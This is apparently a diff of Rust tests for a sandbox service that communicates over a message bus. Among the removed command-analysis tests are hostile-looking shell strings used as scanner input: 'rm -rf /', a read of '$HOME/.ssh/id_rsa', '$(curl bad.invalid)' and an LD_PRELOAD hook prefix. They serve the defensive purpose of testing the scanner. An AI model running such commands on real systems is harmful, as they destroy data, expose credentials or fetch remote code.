@@ -4,10 +4,15 @@ use super::{
     BoxService, INTERFACE, OBJECT_PATH, Platform, capabilities_for, describe, registered_sandboxes,
     setup,
 };
+use std::sync::Arc;
 use tinybox_core::{IsolationLevel, SandboxCapabilities, SnapshotSupport};
 use tinybus::broker::Broker;
 use tinybus::transport::memory::MemoryBus;
 use tinybus::{Connection, Interface};
+use tinystoragedrivers_api::StorageBackend;
+use tinystoragedrivers_busproxy::{PerCallerEndpoint, ServedStorage, StorageServer, serve};
+use tinystoragedrivers_testkit::MemoryBackend;
+use tinystoragedrivers_types::Scope;
 
 /// A container-class backend, standing in for one a later milestone registers.
 const CONTAINER: SandboxCapabilities =
@@ -19,49 +24,27 @@ const CONTAINER: SandboxCapabilities =
 /// A backend too weak to be trusted with untrusted code.
 const BARE: SandboxCapabilities = SandboxCapabilities::PASSTHROUGH;
 
-#[tokio::test]
-async fn command_facts_keep_quoted_heredoc_data_out_of_host_policy_inputs() -> tinybus::Result<()> {
-    let analysis = BoxService::default()
-        .analyze_command(
-            "cat <<'EOF' > report.txt\nrm -rf /; $HOME/.ssh/id_rsa; $(curl bad.invalid)\nEOF\n"
-                .into(),
-        )
-        .await?;
-    assert!(analysis.redirection);
-    assert!(!analysis.hidden_execution);
-    assert!(!analysis.expansion);
-    assert!(!analysis.background);
-    // Preserve the existing scanner's delimiter segment and conservative
-    // unknown-command category while excluding the document body.
-    assert_eq!(analysis.segments.len(), 2);
-    assert_eq!(analysis.segments[1].normalized_name, "eof");
-    assert_eq!(analysis.segments[1].class, tinybox_bus::CommandClass::Write);
-    assert_eq!(analysis.segments[0].normalized_name, "cat");
-    assert_eq!(analysis.segments[0].class, tinybox_bus::CommandClass::Read);
-    assert!(
-        !analysis
-            .literal_words
-            .iter()
-            .any(|word| word.contains(".ssh") || word.contains("curl"))
-    );
-    Ok(())
+struct ServedTestStorage {
+    _host: Connection,
+    _served: ServedStorage,
 }
 
-#[tokio::test]
-async fn command_facts_preserve_global_install_and_environment_execution_signals()
--> tinybus::Result<()> {
-    let analysis = BoxService::default()
-        .analyze_command("LD_PRELOAD=./hook.so git status && npm install -g tool &".into())
-        .await?;
-    assert!(analysis.background);
-    assert!(analysis.segments[0].leading_env_assignment);
-    assert!(analysis.segments[0].dangerous_env_prefix);
-    assert_eq!(analysis.segments[0].basename, "git");
-    assert_eq!(
-        analysis.segments[1].class,
-        tinybox_bus::CommandClass::Install
-    );
-    Ok(())
+async fn serve_test_storage(bus: &MemoryBus) -> tinybus::Result<ServedTestStorage> {
+    let backend = Arc::new(MemoryBackend::new());
+    let host = Connection::connect(bus.connect().await?).await?;
+    let bound = Arc::clone(&backend);
+    let endpoint = PerCallerEndpoint::new(move |_sender| {
+        let scope = Scope::new("tinybox/module-test").ok()?;
+        let storage = bound.for_scope(&scope).ok()?;
+        Some(StorageServer::new(storage))
+    });
+    let served = serve(&host, Arc::new(endpoint))
+        .await
+        .map_err(|error| tinybus::Error::failed(error.to_string()))?;
+    Ok(ServedTestStorage {
+        _host: host,
+        _served: served,
+    })
 }
 
 #[tokio::test]
@@ -247,6 +230,8 @@ async fn new_module_operations_dispatch_and_preserve_validation_errors() -> tiny
                 allow_subprocess: false,
                 enforcement: tinybox_bus::JailEnforcement::Declared,
                 require_process_isolation: false,
+                deny_read: Vec::new(),
+                resources: None,
             },
         )
         .await;
@@ -382,7 +367,7 @@ async fn module_describes_itself_over_a_real_bus() -> tinybus::Result<()> {
     Ok(())
 }
 
-#[tokio::test]
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
 #[expect(
     clippy::too_many_lines,
     reason = "one broker fixture verifies the complete serialized file-transfer path"
@@ -398,6 +383,7 @@ async fn workspace_file_transfers_roundtrip_through_the_bus_codec() -> tinybus::
         .map_err(|error| tinybus::Error::failed(format!("create workspace fixture: {error}")))?;
     let bus = MemoryBus::new();
     Broker::new().spawn(bus.clone());
+    let _storage_host = serve_test_storage(&bus).await?;
     let service = Connection::connect(bus.connect().await?).await?;
     setup(service.clone()).await?;
     let client = Connection::connect(bus.connect().await?).await?;
@@ -529,11 +515,13 @@ async fn an_unknown_method_is_rejected() -> tinybus::Result<()> {
 
     let client = Connection::connect(bus.connect().await?).await?;
     let proxy = client.proxy(INTERFACE, OBJECT_PATH, INTERFACE)?;
-    let result = proxy.call::<String>("Snapshot", ()).await;
+    let result = proxy
+        .call::<String>("AnalyzeCommand", ("echo hello",))
+        .await;
 
     assert!(
         result.is_err(),
-        "a method outside the declared surface should be refused"
+        "the removed command-policy method must not be present in contract 2.0"
     );
     Ok(())
 }
@@ -544,12 +532,11 @@ async fn shell_analysis_preserves_quoted_heredoc_data() -> tinybus::Result<()> {
     let quoted = service
         .analyze_shell("cat > out << 'EOF'\n$(danger) &\nEOF\n".into())
         .await?;
-    assert!(!quoted.hidden_execution);
     assert!(quoted.redirection);
+    assert_eq!(quoted.segments.len(), 2);
     let unquoted = service
         .analyze_shell("cat << EOF\n$(danger)\nEOF\n".into())
         .await?;
-    assert!(unquoted.hidden_execution);
     assert!(!unquoted.redirection);
     let heredoc_redirect = service
         .analyze_shell("cat << EOF\nbody > is data\nEOF\n".into())
@@ -622,13 +609,14 @@ async fn unknown_resources_and_unsupported_backends_are_refused() -> tinybus::Re
 }
 
 #[cfg(unix)]
-#[tokio::test]
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
 async fn commands_and_detached_process_lifetimes_work_over_the_bus() -> tinybus::Result<()> {
     use tinybox_bus::{
         CreateRequest, ExecOutput, ExecRequest, ProcessRef, ResourceInfo, Workspace,
     };
     let bus = MemoryBus::new();
     Broker::new().spawn(bus.clone());
+    let _storage_host = serve_test_storage(&bus).await?;
     let service = Connection::connect(bus.connect().await?).await?;
     setup(service.clone()).await?;
     let client = Connection::connect(bus.connect().await?).await?;
@@ -727,12 +715,16 @@ async fn commands_and_detached_process_lifetimes_work_over_the_bus() -> tinybus:
 }
 
 #[cfg(unix)]
-#[tokio::test]
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
 async fn cleanup_retires_known_reservations_even_before_startup() -> tinybus::Result<()> {
     use tinybox_bus::{
         CreateRequest, ExecRequest, ProcessRef, ResourceId, SpawnRequest, Workspace,
     };
-    let service = BoxService::default();
+    let bus = MemoryBus::new();
+    Broker::new().spawn(bus.clone());
+    let _storage_host = serve_test_storage(&bus).await?;
+    let service_connection = Connection::connect(bus.connect().await?).await?;
+    let service = BoxService::connected(service_connection);
     let resource = service
         .reserve(tinybox_bus::ReserveRequest::Resource)
         .await?;
@@ -821,7 +813,7 @@ async fn cleanup_retires_known_reservations_even_before_startup() -> tinybus::Re
     Ok(())
 }
 
-#[tokio::test]
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
 async fn bounded_live_output_roundtrips_through_the_bus_codec() -> tinybus::Result<()> {
     use tinybox_bus::{
         CreateRequest, ExecRequest, ExecutionState, OutputBatch, ProcessRef, ReserveRequest,
@@ -829,6 +821,7 @@ async fn bounded_live_output_roundtrips_through_the_bus_codec() -> tinybus::Resu
     };
     let bus = MemoryBus::new();
     Broker::new().spawn(bus.clone());
+    let _storage_host = serve_test_storage(&bus).await?;
     let service = Connection::connect(bus.connect().await?).await?;
     setup(service.clone()).await?;
     let client = Connection::connect(bus.connect().await?).await?;
@@ -1064,12 +1057,13 @@ async fn unsupported_git_include_expansions_refuse_the_whole_discovery()
     Ok(())
 }
 
-#[tokio::test]
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
 async fn native_shell_selection_and_execution_roundtrip_through_the_bus_codec()
 -> Result<(), Box<dyn std::error::Error>> {
     let state = tempfile::tempdir()?;
     let bus = MemoryBus::new();
     Broker::new().spawn(bus.clone());
+    let _storage_host = serve_test_storage(&bus).await?;
     let service = Connection::connect(bus.connect().await?).await?;
     setup(service.clone()).await?;
     let client = Connection::connect(bus.connect().await?).await?;
@@ -1150,11 +1144,12 @@ async fn native_shell_selection_and_execution_roundtrip_through_the_bus_codec()
     Ok(())
 }
 
-#[tokio::test]
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
 async fn existing_shell_method_keeps_its_two_argument_bus_codec()
 -> Result<(), Box<dyn std::error::Error>> {
     let bus = MemoryBus::new();
     Broker::new().spawn(bus.clone());
+    let _storage_host = serve_test_storage(&bus).await?;
     let service = Connection::connect(bus.connect().await?).await?;
     setup(service.clone()).await?;
     let client = Connection::connect(bus.connect().await?).await?;
@@ -1301,4 +1296,59 @@ async fn validate_docker_policy_reports_the_run_checks_without_a_daemon()
     assert_eq!(unsafe_run.issues.len(), 4);
     assert!(unsafe_run.issues[0].contains("host network"));
     Ok(())
+}
+
+#[tokio::test]
+async fn stdio_members_refuse_unknown_handles_without_starting_anything() -> tinybus::Result<()> {
+    use tinybox_bus::{
+        JailEnforcement, NativeJailConfig, ProcessRef, ResourceId, StdioReadRequest,
+        StdioStartRequest, StdioWriteRequest,
+    };
+    let service = BoxService::default();
+    let ghost = ProcessRef {
+        resource: ResourceId("resource".into()),
+        process: ResourceId("process".into()),
+    };
+    let start = StdioStartRequest {
+        process: ResourceId("process".into()),
+        resource: ResourceId("resource".into()),
+        argv: vec!["cat".into()],
+        cwd: None,
+        env: std::collections::BTreeMap::new(),
+        jail: NativeJailConfig {
+            read_only: Vec::new(),
+            read_write: Vec::new(),
+            unix_paths: tinybox_bus::UnixPathGrants::default(),
+            allow_net: false,
+            allow_subprocess: false,
+            enforcement: JailEnforcement::Enforced,
+            require_process_isolation: true,
+            deny_read: Vec::new(),
+            resources: None,
+        },
+    };
+    assert!(service.start_stdio(start).await.is_err());
+    assert!(
+        service
+            .write_stdio(StdioWriteRequest {
+                process: ghost.clone(),
+                data: b"x".to_vec(),
+            })
+            .await
+            .is_err()
+    );
+    assert!(
+        service
+            .read_stdio(StdioReadRequest {
+                process: ghost.clone(),
+                max_bytes: 0,
+                wait_ms: 0,
+            })
+            .await
+            .is_err()
+    );
+    assert!(service.close_stdin(ghost.clone()).await.is_err());
+    assert!(service.stdio_status(ghost.clone()).await.is_err());
+    // Killing what is not there is already done.
+    service.kill_stdio(ghost).await
 }
